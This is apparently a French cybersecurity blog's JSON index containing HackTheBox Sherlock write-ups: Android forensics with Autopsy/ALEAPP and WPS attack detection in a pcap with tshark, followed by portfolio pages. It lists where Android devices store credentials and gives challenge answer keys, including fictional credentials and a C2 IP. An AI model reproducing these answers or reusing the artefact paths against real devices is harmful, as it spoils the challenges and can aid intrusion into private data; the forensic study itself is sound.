imposé l\u0026rsquo;utilisation de la version 4.4 ou supérieur du Kernel Linux. Par exemple Android v9 (Pie) fonctionne sur les versions 4.4, 4.9 ou 4.14 selon l\u0026rsquo;appareil. Plus d\u0026rsquo;info disponnible sur le wiki d\u0026rsquo;Android OS https://source.android.com/docs/core/architecture/kernel/android-common?hl=fr.\nandroid-mainline est la principale branche de développement des fonctionnalités Android. La ligne principale Linux est fusionnée avec android-mainline chaque fois que Linus Torvalds publie une version ou une version candidate :\nOn retrouve principalement ces systèmes de fichiers :\nEXT4 F2FS YAFFS2 exFAT La plupart des artefacts sont des DB SQLite et des fichiers XML. Android isole les applications au niveau du Kernel, leur attribuant un identifiant unique (UID) pour suivre les applications exécutées.\nAndroid Architecture #\rLe noyau Linux constitue la base d\u0026rsquo;Android, supportant des fonctionnalités cruciales telles que les threads et la gestion de la mémoire de bas niveau utilisées par Android Runtime (ART).\nLe HAL fournit des interfaces standardisées qui exposent les fonctionnalités matérielles aux API Java de niveau supérieur. Il est composé de modules de bibliothèque spécifiques à chaque composant matériel (comme la caméra ou le Bluetooth). Lorsqu\u0026rsquo;une API accède au matériel, Android charge le module de bibliothèque correspondant\nL\u0026rsquo;environnement d\u0026rsquo;exécution Android (Android Runtime dit ART) exécute chaque application dans son propre processus et instance. Gérant plusieurs machines virtuelles sur des appareils à faible mémoire grâce au bytecode DEX spécialement conçu et optimisé pour Android. Les outils de compilation comme d8 transforment le code Java en bytecode DEX pour l\u0026rsquo;exécution sur Android.\nDe nombreux composants et services système Android essentiels, tels qu\u0026rsquo;ART et HAL, sont créés à partir de code natif nécessitant des bibliothèques natives écrites en C et C++.\nLes fonctionnalités d\u0026rsquo;Android sont accessibles via des API Java, facilitant la réutilisation des principaux composants et services système modulaires comme les notifications, la gestion des ressources et la localisation.\nLes applications système sont l\u0026rsquo;ensemble des applications de base fournies avec Android.\nAndroid Virtual Machine #\rLes VM sont utilisés comme couches d\u0026rsquo;abstraction entre une application et l\u0026rsquo;appareil Android sous-jacent.\nChaque application fonctionne dans sa propre instance dans une VM, isolant les applications les unes des autres.\nLes applications Android sont écrites en Java mais sont compilées et compilées en bytecode Java.\nCe bytecode est ensuite transformé en bytecode Dalvik (fichiers .dex) ou bytecode ART.\nDalvik et ART exécutent le bytecode (.dex) dans une machine virtuelle, permettant aux applications de fonctionner indépendamment du matériel sous-jacent.\nAvant KitKat (v.4.4), Android utilisait des VM Dalvik.\nAvec Lollipop (v5.0), Android a commencé à utiliser Android Runtime (ART) et a cessé d\u0026rsquo;utiliser la VM Dalvik.\nLes deux environnements d\u0026rsquo;exécution Dalvik et ART fonctionnent avec le bytecode DEX, mais ART possède de nouvelles fonctionnalités d\u0026rsquo;optimisation.\nDirectory structure #\r/cache : peut contenir des pièces jointes gmail, des téléchargements, des données de navigation et des mises à jour OTA /efs : contient des fichiers nécessaires au fonctionnement de l\u0026rsquo;appareil en cas de défaillance /data : /data/data : contient les dossiers des applications (/data/data/com.example.app), les fichiers de configurations des apps, les DB SQLite des apps, leurs logs, cache etc. /app : contient des fichiers .apk du marché Android *Des malwares peuvent être trouvés ici /backup : stocke l\u0026rsquo;API de sauvegarde pour les développeurs donc les données de sauvegarde des utilisateurs ne sont pas stockées ici /media : l\u0026rsquo;emplacement de stockage interne équivalent à une carte SD. *Des malwares malveillants peuvent être trouvés ici /misc : les fichiers liés à Bluetooth, dhcp, vpn, Wi-Fi, etc. sont stockés ici /system : contient des fichiers clés tels que gesture.key et passwords.key ; le fichier accounts.db qui contient les usernames et les mots de passe pour l\u0026rsquo;authentification des fichiers etc. /property : contient les propriétés du système, y compris le fuseau horaire, les paramètres de langue, etc. /mnt : /asec : stocke les données non chiffrés des apps /DCIM : stocke les thumbnails des albums /Pictures : stocke les images de l\u0026rsquo;appareil photo /downloads : fichiers téléchargés localement /secure/asec : stocke les données chiffrés des apps /system : /app : contient des fichiers .apk. *Des malwares peuvent être trouvés ici /priv-app : contient des fichiers \u0026amp; apk avec des permissions au niveau du système. *Des malwares peuvent être trouvés ici Pour avoir plus d\u0026rsquo;informations sur\nles permissions des app : https://developer.android.com/guide/topics/permissions/overview?hl=fr ; https://blog.mindorks.com/what-are-the-different-protection-levels-in-android-permission/ la CLI d\u0026rsquo;Android : https://developer.android.com/tools/adb?hl=fr Setup #\rAu vu des fichiers et du scénario, je vais utiliser l\u0026rsquo;outil Autopsy. Cela peut prendre un peu de temps à ce setup, c\u0026rsquo;est pour cela que j\u0026rsquo;attaque cela ici.\nSi vous ne connaissez pas Autopsy, voici une briève description :\nAutopsy est un outil d\u0026rsquo;investigation numérique opensource. Il se rapporte à l\u0026rsquo;interface graphique du Sleuth Kit et d\u0026rsquo;autres outils de forensic. Il est utilisé pour analyser des disques durs et des smartphones dans le cadre d\u0026rsquo;enquêtes. Les fonctionnalités clés d\u0026rsquo;Autopsy incluent la récupération de fichiers supprimés, l\u0026rsquo;analyse des métadonnées, la recherche par mots-clés, la visualisation des timelines d\u0026rsquo;activités, et l\u0026rsquo;analyse des systèmes de fichiers etc.\nPour l\u0026rsquo;utiliser, nous devons créer une \u0026ldquo;Case\u0026rdquo; :\nIci, nous savons que nous n\u0026rsquo;avons pas à faire à une \u0026ldquo;Disk Image\u0026rdquo; ou à une VM, de même pour un disque local. Nous choisissons donc l\u0026rsquo;option appropriée \u0026ldquo;Logical Files\u0026rdquo; :\nOn attend qu\u0026rsquo;Autopsy \u0026amp; ses modules terminent l\u0026rsquo;ingestion. Cela peut prendre un moment.\nC\u0026rsquo;est bon, on peut commencer l\u0026rsquo;investigation :\nQuestions #\rQuestion 1 #\rQuelle est l\u0026rsquo;adresse mail de l\u0026rsquo;agent qui a été utilisée dans diverses applications/services ?\nPour y répondre, je vais utiliser le rapport qu\u0026rsquo;Autopsy a généré via ALEAPP (Android Logs Events And Protobuf Parser), un projet open-source qui vise à analyser tous les artefacts Android connus à des fins d\u0026rsquo;analyse forensic.\nPour trouver rapidement et simplement nous pouvons chercher dans :\n/data/data/com.android.vending/databases/library.db pour y trouver le compte google utilisé pour download des apps /data/data/com.android.providers.contacts/databases/contacts2.db pour y trouver le compte google utilisé pour synchroniser ses contacts Mais aussi (mais non applicable sur ce challenge) ici :\n/data/com.android.vending/shared_prefs/lastaccount.xml (dernier compte utilisé sur Google PlayStore (Android 9 et plus)) /data/com.google.android.gms/shared_prefs/BackupAccount.xml (email du compte de backup) /data/com.android.email/databases/EmailProvider.db (email accounts, 3rd party app data et les messages associés aux notifications par emails) Enfin bref, on se retrouve donc avec le rapport en format html :\nOn peut retrouver son adresse mail un peu partout.\nDans l\u0026rsquo;app \u0026ldquo;Chrome\u0026rdquo; par exemple avec la partie \u0026ldquo;Autofill\u0026rdquo; (fonctionnalité qui permet de remplir automatiquement des formulaires avec des informations préenregistrées) :\nDans les \u0026ldquo;Login Data\u0026rdquo; de Chrome :\nEnfin dans la partie \u0026ldquo;Installed Apps (Library)\u0026rdquo; nous retrouvons l\u0026rsquo;adresse mail du compte google utilisé pour download des apps :\nRéponse : olegpachinksy@gmail.com\nQuestion 2 #\rQuel est le numéro de contact du gestionnaire (handler) affecté à l\u0026rsquo;agent qui a été arrêté ?\nDans la partie \u0026ldquo;Contacts\u0026rdquo; :\nRéponse : +323145232315\nQuestion 3 #\rRécupérer les identifiants et le lien du portail officiel des agents ravenskiens. Cela peut nous donner un avantage en matière de renseignement car nous pouvons utiliser cet accès pour obtenir d\u0026rsquo;autres informations exploitables sur les opérations que le gouvernement ravenskien planifie.\nNous avons déjà trouvé la réponse à cette question à la question n°1 via les \u0026ldquo;Login Data\u0026rdquo; de Chrome :\nRéponse : agent.ravensk.idu.com:olegpachinksy007:HBLKNKD0MADsdfsa2334(*\u0026amp;DSMDB\nQuestion 4 #\rQuel est le code de contact utilisé pour confirmer l\u0026rsquo;identité de l\u0026rsquo;agent et du gestionnaire lors de l\u0026rsquo;utilisation d\u0026rsquo;un canal de discussion sécurisé ?\nPremièrement je vais vérifier les potentiels SMS ici : /data/data/com.android.providers.telephony/databases/mmssms.db.\nNous n\u0026rsquo;y trouvons rien.\nNous pourrions aussi chercher ici mais non applicable sur ce challenge :\n/data/com.google.android.gms/databases/icing_mmssms.db (SMS/MMS) /data/com.google.android.gms/databases/ipa_mmssms.db (SMS/MMS) Nous devons donc trouver l\u0026rsquo;app de messagerie utilisé. On peut voir toutes les apps installées dans la partie \u0026ldquo;Installed Programs\u0026rdquo; d\u0026rsquo;Autopsy :\nOn y trouve différente catégorie :\nInstalled Apps (GMS) Installed Apps (Library) Installed Apps (Vending) Installed Apps - GMS : Cette catégorie concerne les applications installées sur l\u0026rsquo;appareil, quel que soit leur mode d\u0026rsquo;installation. On peut retrouver ces données ici : /data/com.google.android.gms/databases/.\nInstalled Apps - Library : Cette catégorie se réfère à la bibliothèque d\u0026rsquo;applications pour l\u0026rsquo;utilisateur Google utilisant l\u0026rsquo;appareil. Il est important de noter que cette DB n\u0026rsquo;est pas liée aux applications installées sur l\u0026rsquo;appareil, elle peut contenir des applications installées par le même compte Google sur un autre appareil ou sur une précédente installation de l\u0026rsquo;appareil analysé. On peut retrouver ces données ici : /data/com.android.vending/databases/.\nInstalled Apps - Vending : Cette catégorie concerne spécifiquement les applications installées sur l\u0026rsquo;appareil via le Google Play Store, excluant celles installées par d\u0026rsquo;autres moyens. Ces données ne sont pas supprimées lorsque l\u0026rsquo;application est désinstallée. Elles sont stockées dans une DB SQLite située ici : /data/com.android.vending/databases/.\nPour plus de lisibilité retournons sur ALEAPP et concentrons-nous sur les apps de type \u0026ldquo;Vending\u0026rdquo; :\nL\u0026rsquo;app qui saute au yeux c\u0026rsquo;est mega.privacy.android.app. Et en effet, c\u0026rsquo;est une application de messagerie :\nJustement ALEAPP a parsé les messages échangés via MEGA :\nOn peut retrouver ces infomations ici : /data/data/mega.privacy.android.app/karere-TU1IaTh4TUJpdTQKAfO_2P0qU8NMP7zDRlgv.db.\nRéponse : REDAPPLEONACAR\nQuestion 5 #\rLe gestionnaire a partagé un document avec l\u0026rsquo;agent en utilisant un service de stockage cloud. Quand ce fichier a-t-il été partagé avec l\u0026rsquo;agent ?\nRien dans les messages. Le document a donc dû être transmis d\u0026rsquo;une autre manière. Nous savons qu\u0026rsquo;il n\u0026rsquo;y a pas d\u0026rsquo;autre app de messagerie et qu\u0026rsquo;il n\u0026rsquo;a pas pu lui communiquer via SMS/MMS.\nDans les app installé nous avons vu com.google.android.apps.docs. Allons donc chercher ici : \\data\\data\\com.google.android.apps.docs.\nOn y trouve la DB /data/data/com.google.android.apps.docs/app_cello/olegpachinksy@gmail.com/cello.db contenant ces informations :\nOn peut d\u0026rsquo;ailleurs retrouver ce fichier ici : EVIDENCE-CASE-RAVENSKIAN-AGENT-002/storage/emulated/0/Download/Debrief-Velorian OP Expansion East.pdf :\nNéanmoins attention, par défaut Autopsy interprète les timestamps avec la time zone de votre ordinateur. Pensez bien à modifier ce paramètre dans Autopsy (Tools \u0026gt; Options \u0026gt; View \u0026gt; Time Zone).\nRéponse : 2024-04-01 09:36:41\nQuestion 6 #\rQuel est l\u0026rsquo;URI de téléchargement du fichier partagé précédemment identifié ?\nNous savons que le fichier a été téléchargé car nous l\u0026rsquo;avons retrouvé dans /storage/emulated/0/Download/.\nNous pouvons donc chercher dans /data/data/com.android.providers.downloads/databases/downloads.db :\nRéponse : https://www.googleapis.com/drive/v2internal/files/1iQKKlBU2vuJD1Xet6IYPt7IODVtDHxv1?alt=media\u0026amp;source=downloadUrl\u0026amp;auditContext=fileAction\u0026amp;reason=909\u0026amp;syncType=1\u0026amp;featureLabel=android-sync-classic\u0026amp;openDrive=false\u0026amp;errorRecovery=false\u0026amp;originatorApp=102\nQuestion 7 #\rAfin d\u0026rsquo;obtenir davantage d\u0026rsquo;informations pour le contre-espionnage de Veloria, quel était l\u0026rsquo;objectif principal de cette cyber-opération menée par le gouvernement de Ravensk ?\nRevenons au document :\nRéponse : Infiltrate the Velorian secured network to gather intelligence on upcoming cyber-attacks, their techniques, and target countries.\nQuestion 8 #\rL\u0026rsquo;identification du gestionnaire est également cruciale pour que les forces de l\u0026rsquo;ordre véloriennes puissent comprendre l\u0026rsquo;étendue de cette opération. Quelle est l\u0026rsquo;adresse électronique utilisée par le manipulateur ?\nNous l\u0026rsquo;avons déjà vu dans les messages de l\u0026rsquo;app MEGA :\nRéponse : ivoryalex783@gmail.com\nQuestion 9 #\rQuel est le nom de l\u0026rsquo;endroit où l\u0026rsquo;agent et le gestionnaire se sont rencontrés ?\nRevenons aux messages :\nC\u0026rsquo;est la question qui m\u0026rsquo;a pris le plus de temps, j\u0026rsquo;ai dû bloquer une bonne heure dessus.\nPremièrement, j\u0026rsquo;ai cherché dans les endroits habituels :\n/data/com.google.android.apps.maps/databases/gmm_storage.db /data/com.google.android.apps.maps/databases/search_history.db /data/com.google.android.apps.maps/databases/da_destination_history /data/com.sec.android.daemonapp/db/weatherClock /data/com.google.android.apps.maps/app_tts-cache/ /data/com.google.android.apps.maps/cache/image_manager_disk_cache/ Après n\u0026rsquo;avoir rien trouvé, je me suis dit qu\u0026rsquo;il était sans doute possible que la réponse soit dans les metadatas des images sur le téléphone. En effet, on retrouve 48 images dont plusieurs de bar :\nNéanmoins, rien de probant.\nJe me suis donc posé plusieurs questions :\nil y a-t-il d\u0026rsquo;autres applications de navigation / localisation sur le téléphone ? est-il sûr que je dois chercher dans l\u0026rsquo;app Google Maps ? Non, seulement Google Maps. Non, il est peut-être possible qu\u0026rsquo;il ait fait la recherche sur son navigateur et non sur l\u0026rsquo;app etc. Ayant déjà vérifié les points habituels des artefacts de google maps j\u0026rsquo;ai préféré chercher dans le navigateur mais je n\u0026rsquo;ai rien trouvé.\nJe suis donc retourné fouiller dans les artefacts de google maps :\napp : RAS app_offline_downloads : RAS app_offline_hashes : RAS app_textures : RAS app_webview : RAS cache : RAS databases : trop de fichiers, j\u0026rsquo;y reviendrai plus tard files : \u0026ldquo;new_recent_history_cache_search.cs\u0026rdquo; Je me rends compte que j\u0026rsquo;aurais simplement pu chercher par mot-clé \u0026ldquo;Pub\u0026rdquo; 🤡\nRéponse : Levstik Pub\nQuestion 10 #\rD\u0026rsquo;après le chat retrouvé entre l\u0026rsquo;agent et le gestionnaire, il semble que ce dernier ait envoyé à l\u0026rsquo;agent arrêté une image relative à l\u0026rsquo;infrastructure utilisée par le gouvernement ravenskien pour cette opération de cyberespionnage. Quel est le cadre C2 utilisé par le gouvernement ravenskien ?\nAyant déjà vérifié toutes les images pour répondre à la question 9 j\u0026rsquo;ai déjà la réponse.\nRéponse : Empire\nQuestion 11 #\rLa collecte d\u0026rsquo;informations sur l\u0026rsquo;infrastructure, telles que les adresses IP ou les noms d\u0026rsquo;hôtes, est cruciale pour les autorités véloriennes, qui préparent une opération de contre-offensive. D\u0026rsquo;après l\u0026rsquo;image récupérée envoyée par le gestionnaire à l\u0026rsquo;agent, quelle est l\u0026rsquo;adresse IP de l\u0026rsquo;un des serveurs C2 exploités par les acteurs de la menace ravenskiens ?\nRéponse : 98.24.12.45\n","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/opshieldwall-2/","section":"Posts","summary":"Scénario #\rNous avons réussi à confirmer la localisation de l\u0026rsquo;acteur malveillant qui a compromis le réseau WiFi de notre gouvernement.","title":"OpShieldWall-2","type":"posts"},{"content":"","date":"7 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"7 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/network-forensic/","section":"Tags","summary":"","title":"Network Forensic","type":"tags"},{"content":"\rScénario #\rMerci d\u0026rsquo;avoir répondu à notre appel. Le ministère de la Défense de Velorian a désespérément besoin d\u0026rsquo;aide\u0026hellip;\nNous devons rester discrets, mais nous pensons que le Wi-Fi public des bureaux du ministère de la Défense de Velorian a été compromis. L\u0026rsquo;impact semble faible, mais les diagrammes du réseau montrent qu\u0026rsquo;aucune segmentation réelle du réseau n\u0026rsquo;a été réalisée et que le trafic entre les appareils est autorisé. Les ministres du gouvernement utilisent ce réseau avec des équipements BYoD et des hôtes Velorian MoDNet. Veuillez analyser le pcap fourni et confirmer comment et quand cela s\u0026rsquo;est produit. N\u0026rsquo;oubliez pas que cette enquête est de type TLP Amber.\nFichiers #\ropshieldwall1.zip contenant la capture réseau \u0026ldquo;VELORIA-NETWORK.pcap\u0026rdquo; Setup #\rAu vu de la simplicité de ce challenge, on peut simplement se limiter à tshark / wireshark.\nQuestions #\rQuestion 1 #\rVeuillez confirmer le SSID de notre réseau WiFi.\nPremièrement, familiarisez-nous avec la capture. Nous allons utiliser la commande suivante afin d\u0026rsquo;avoir des statistiques :\n$ tshark -r traffic.pcapng -qz -r permet de lire (read) un fichier -q permet d\u0026rsquo;être plus \u0026ldquo;quiet\u0026rdquo; à la sortie (utile pour les stats car cela permet d\u0026rsquo;afficher les statistiques globales, et non par paquet.) -z permet l\u0026rsquo;affichage de statistiques Il y a beaucoup de valeurs possible (tshark -z help pour les afficher) mais ici nous souhaitons avant tout savoir :\nle nombre de paquet la durée de la capture les IPv4 avec le plus de paquet les IPv4 endpoints échangeant ensemble le plus les protocoles les plus utilisés Nombre de paquet et durée : 106 ; 31.6 sec\n$ tshark -r VELORIA-NETWORK.pcap -qz io,stat,0 =================================== | IO Statistics | | | | Duration: 31.6 secs | | Interval: 31.6 secs | | | | Col 1: Frames and bytes | |---------------------------------| | |1 | | | Interval | Frames | Bytes | | |-------------------------------| | | 0.0 \u0026lt;\u0026gt; 31.6 | 106 | 20759 | | =================================== IPv4 endpoints :\navec le plus de paquet : $ tshark -r VELORIA-NETWORK.pcap -qz endpoints,ip ================================================================================ IPv4 Endpoints Filter:\u0026lt;No Filter\u0026gt; | Packets | | Bytes | | Tx Packets | | Tx Bytes | | Rx Packets | | Rx Bytes | 0.0.0.0 3 1044 3 1044 0 0 255.255.255.255 3 1044 0 0 3 1044 10.0.3.1 3 1048 3 1048 0 0 10.0.3.52 3 1048 0 0 3 1048 ================================================================================ échangeant le plus : tshark -r VELORIA-NETWORK.pcap -qz conv,ip ================================================================================ IPv4 Conversations Filter:\u0026lt;No Filter\u0026gt; | \u0026lt;- | | -\u0026gt; | | Total | Relative | Duration | | Frames Bytes | | Frames Bytes | | Frames Bytes | Start | | 0.0.0.0 \u0026lt;-\u0026gt; 255.255.255.255 0 0 bytes 3 1044 bytes 3 1044 bytes 23.256576000 8.3680 10.0.3.1 \u0026lt;-\u0026gt; 10.0.3.52 0 0 bytes 3 1048 bytes 3 1048 bytes 23.256959000 8.3693 ================================================================================ Protocoles les plus utilisés :\ntshark -r VELORIA-NETWORK.pcap -qz io,phs =================================================================== Protocol Hierarchy Statistics Filter: sll frames:106 bytes:20759 radiotap frames:92 bytes:17572 wlan_radio frames:92 bytes:17572 wlan frames:92 bytes:17572 wlan.mgt frames:92 bytes:17572 eapol frames:6 bytes:999 eap frames:6 bytes:999 ip frames:6 bytes:2092 udp frames:6 bytes:2092 dhcp frames:6 bytes:2092 arp frames:2 bytes:96 =================================================================== Pour répondre à la question, il suffit d\u0026rsquo;utiliser la commande :\n$ tshark -r VELORIA-NETWORK.pcap -T fields -e wlan.ssid | head -n 1 | xxd -r -p VELORIA-MoD-AP012 Explication : (https://www.wireshark.org/docs/dfref/w/wlan.html)\n-t affiche uniquement les champs spécifiés par l\u0026rsquo;utilisateur (nécessite donc forcément l\u0026rsquo;utilisation de l\u0026rsquo;option -e pour spécifier les champs). -e wlan.ssid spécifie que le champ wlan.ssid (SSID des réseaux sans fil) doit être extrait et affiché. -xxd -r -p l\u0026rsquo;output étant une suite hexadécimale, cela permet de le convertir en texte lisible Réponse : VELORIA-MoD-AP012\nQuestion 2 #\rVeuillez confirmer l\u0026rsquo;adresse MAC du point d\u0026rsquo;accès (AP).\ntshark -r VELORIA-NETWORK.pcap -T fields -e wlan.sa | head -n 1 02:00:00:00:01:00 Réponse : 02:00:00:00:01:00\nQuestion 3 #\rVeuillez confirmer l\u0026rsquo;état/le mécanisme d\u0026rsquo;authentification de l\u0026rsquo;AP et le vecteur d\u0026rsquo;attaque.\nPassons à Wireshark.\nRéponse : WPS\nQuestion 4 #\rQuel est le numéro de paquet où l\u0026rsquo;attaque a-t-elle commencé ?\nOn peut facilement en déduire que c\u0026rsquo;est à la première tentative de connexion (étant les seuls dans la capture).\nRéponse : 93\nQuestion 5 #\rQuel est le numéro de paquet où l\u0026rsquo;attaque s\u0026rsquo;est-elle terminée ?\nOn peut facilement en déduire que c\u0026rsquo;est lorsque l\u0026rsquo;authentifcation a échoué.\nRéponse : 8\n","date":"7 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/opshieldwall-1/","section":"Posts","summary":"Scénario #\rMerci d\u0026rsquo;avoir répondu à notre appel.","title":"OpShieldWall-1","type":"posts"},{"content":"\rDiplômes #\rLes images sont des liens cliquables.\nEn cours (Promo 2026) Mastère (BAC+5) - Expert de la sécurité des données, des réseaux et des systèmes\nUniquement en alternance\nJe m'occupe des entretiens de motivation et technique des nouveaux étudiants\n(N° RNCP 38951) Bachelor (BAC+3) - Cybersécurité \u0026 Ethical Hacking\n3ème année en alternance\nMention - Très bien\rBachelor (BAC+3) - Concepteur de Systèmes d'Information Mention - Très bien\rListe de tous les challenges, labs, box etc. que j\u0026rsquo;ai effectué mais aussi des cours, conférences et trainings auquels j\u0026rsquo;ai assisté :\nHackTheBox #\rIron = Insane Red = Hard Orange = Medium Green = Easy Purple = Very Easy Certaines images ne redirigent pas vers les pages de résultat d\u0026rsquo;HTB car se sont des boxs / sherlocks uniquement disponibles sur la plateforme HackTheBox Entreprise (qui ne permet pas de faire des liens de partage).\nSherlock #\rDFIR / SOC #\rOpShieldWall-7\rStreamer\rAPTNightmare-2\rLatus\rHeartbreaker\rTrent\rAPTNightmare\rNuts\rOpShieldWall-4\rOpShieldWall-2\rOpShieldWall-1\rNeuroSync-D\rPikaptcha\rMeerkat\rBumblebee\rJingle Bell\rRecollection\rKuber\rNoted\rTracer\rLog Jammer\rRogue One\rPhantom-Check\rSmoke-Mirrors\rOrigins\rSmartyPants\rReaper\rCampfire-2\rCampfire-1\rUnit42\rCrownJewel-2\rCrownJewel-1\rBrutus\rNoxious\rMalware Analysis #\rOpShieldWall-6\rLoggy\rHB-Continuum\rCloud #\rNubilum-2\rThreat Intelligence #\rDreamJob-1\rElectricBreeze-1\rUFO-1\rBox #\rLinux #\rOpShieldWall-5\rOpShieldWall-3\rBlurry\rRunner\rIClean\rPerfection\rBoardLight\rHeadless\rWifinetic\rMetaTwo\rLame\rNibbles\rPrecious\rWindows #\rJerry\rNetmon\rBlue\rHackTheBox Academy #\rTranscript.pdf\nRootMe #\rCyberdefenders #\rThreat Hunting #\rHard\rNetwork Forensics #\rHard\rMedium\rMedium\rMedium\rMedium\rMedium\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEndpoint Forensics #\rMedium\rEasy\rThreat Intel #\rMedium\rMedium\rEasy\rEasy\rEasy\rEasy\rCloud Forensics #\rEasy\rTryHackMe #\r92 rooms complétés\nPath :\nPre Security Complete Beginner Web Fundamentals Comptia Pentest+ Cours \u0026amp; formations suivis #\r2025 #\rSANS : FOR585: Smartphone Forensic Analysis In-Depth 13Cubed : Investigating Windows Endpoint 13Cubed : Investigating Windows Memory 13Cubed : Investigating Linux Devices 2024 #\rEvasive Malware : A Field Guide to Detecting, Analyzing, and Defeating Advanced Threats Roman Stuehler : Android App Hacking - Black Belt Edition Kaspersky : Advanced Malware Analysis Techniques Kaspersky : Hunting APTs like a Ninja with YARA OALABS : Reverse Engineering 101 (RE101) Pentherz : Intro to SDR Hacking 2023 #\rOSINT : IntelTechniques Christopher Negus : Linux Bible Opdisk : The Cyber Plumber\u0026rsquo;s Handbook Conf \u0026amp; meetups #\r2025 #\rTHCON - Toulous Hacking Convention 2024 #\rDEFCON Paris Meetup HackTheBox France 2023 #\rHexacon DEFCON Paris LeHack Meetup HackTheBox France ","date":"6 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/portfolio/","section":"Posts","summary":"Diplômes #\rLes images sont des liens cliquables.","title":"Portfolio","type":"posts"},{"content":"Liste des projets que j\u0026rsquo;ai effecuté.\nSelf-Hosted Infrastructure #\rJuin 2023 - maintenant\nProfessional Server (HP ProLiant DL380 Gen9 2U) sous Proxmox Firewall sous OPNsense Self-hosted services et tools: VPN, Security Onion, Wazuh, Cuckoo Sandbox, GitLab, VM pour CTF, labs en tout genre (red team / blue team\u0026hellip;) Un lab spécial de Malware Analysis \u0026amp; d\u0026rsquo;OSINT avec une emphase sur la sécurité, la vie privée et l\u0026rsquo;OPSEC Architecture, network segmentation, intégration IPS/IDS, load balancing, SRE, VPN CTF Challenge Creator #\rJuin 2024 - Juin 2024\nCréation de deux challenges de radio (misc easy and medium) pour le \u0026ldquo;PwnMe CTF 2024\u0026rdquo;.\nhttps://ctftime.org/ctf/807/\nhttps://www.phreaks2600.fr/\nSide Quest - Toolkit Network Forensic \u0026amp; Malware Analysis #\rFévr. 2024 - Juin 2024\nNotre side quest est un projet collaboratif d\u0026rsquo;étudiants pour fournir un toolkit puissant pour la forensique réseau et l\u0026rsquo;analyse de malware. Ce repository contient deux sous-projets qui se concentrent sur différents aspects de l\u0026rsquo;investigation :\nNetwork Forensic Analysis : Outils d\u0026rsquo;analyse du trafic réseau capturé dans des fichiers PCAP. Analyse des malwares : Outils permettant de disséquer les fichiers binaires afin de découvrir des informations cachées et de détecter des caractéristiques malveillantes. https://github.com/jaybird1291/toolkit-network-forensic-malware-analysis-sidequest\n","date":"5 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/projets/","section":"Posts","summary":"Liste des projets que j\u0026rsquo;ai effecuté.","title":"Projets","type":"posts"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/posts/graphite-caught/","section":"Posts","summary":"","title":"","type":"posts"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/series/","section":"Series","summary":"","title":"Series","type":"series"}]